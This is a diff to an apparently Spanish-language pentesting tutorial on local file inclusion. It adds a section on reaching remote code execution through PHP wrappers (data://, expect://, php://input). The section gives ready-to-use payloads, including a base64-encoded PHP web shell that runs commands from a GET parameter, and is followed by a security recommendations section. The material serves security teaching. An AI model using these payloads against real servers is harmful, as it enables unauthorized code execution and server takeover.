@@ -169,6 +169,37 @@ Algunas veces en el payload no es necesario agregar su extensión por ejemplo .p
 
 ```
 
+### RCE con Wrappers
+
+Una forma de ejecutar código en los servidores back-end y obtener control sobre ellos es por medio de wrappers. Algunos payloads son los siguientes:
+
+#### data
+
+```
+echo '<?php system($_GET["cmd"]); ?>' | base64
+
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+```
+
+#### expect
+
+```
+expect://id
+```
+
+#### input
+
+Este caso se debe realizar por el método POST por lo que varía un poco, se muestra a continuación un ejemplo de como se aplica.
+
+```
+php://input&cmd=ls
+
+
+por POST -> '<?php system($_GET["cmd"]); ?>'
+```
+
+[![lfi8](/images/lfi8.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/lfi8.png)
+
 ## Recomendaciones
 
 1. **Validación de la entrada**: La entrada del usuario siempre debe tratarse con sospecha. Nunca deberías usar la entrada del usuario directamente en funciones que trabajan con el sistema de archivos sin validarla primero. La validación debe asegurar que la entrada es segura y está dentro de los parámetros esperados.
